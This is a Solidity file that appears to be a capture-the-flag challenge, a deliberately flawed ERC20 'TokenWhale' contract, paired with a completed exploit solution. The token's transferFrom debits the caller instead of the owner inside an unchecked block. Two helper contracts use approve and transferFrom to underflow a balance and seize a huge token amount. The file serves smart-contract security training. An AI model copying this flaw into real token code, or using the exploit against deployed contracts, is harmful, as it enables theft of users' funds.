// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract TokenWhale {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address _player) {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000;
    }

    function _transfer(address to, uint256 value) internal {
        unchecked {
            balanceOf[msg.sender] -= value;
            balanceOf[to] += value;
        }

        emit Transfer(msg.sender, to, value);
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function transferFrom(address from, address to, uint256 value) public {
        require(balanceOf[from] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);
        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }
}

// Write your exploit contract below
contract ExploitContract {
    TokenWhale public tokenWhale;
    SecondContract public secondContract;

    constructor(TokenWhale _tokenWhale) {
        tokenWhale = _tokenWhale;
    }

    function send() public {
        secondContract = new SecondContract(tokenWhale, this);
        tokenWhale.approve(address(secondContract), type(uint256).max);
        tokenWhale.transfer(address(secondContract), 499);
    }

    function exploit() public {
        secondContract.exploit();
    }

    function sendTo(address to, uint256 value) public {
        tokenWhale.transfer(to, value);
    }

    // write your exploit functions below
}

contract SecondContract {
    TokenWhale public tokenWhale;
    ExploitContract public exploitContract;

    constructor(TokenWhale _tokenWhale, ExploitContract _exploitContract) {
        tokenWhale = _tokenWhale;
        exploitContract = _exploitContract;
    }

    function exploit() public {
        tokenWhale.transferFrom(address(exploitContract), address(exploitContract), 501);
        tokenWhale.transfer(
            address(exploitContract), tokenWhale.balanceOf(address(this)) - tokenWhale.balanceOf(address(msg.sender))
        );
    }

    receive() external payable {}
}
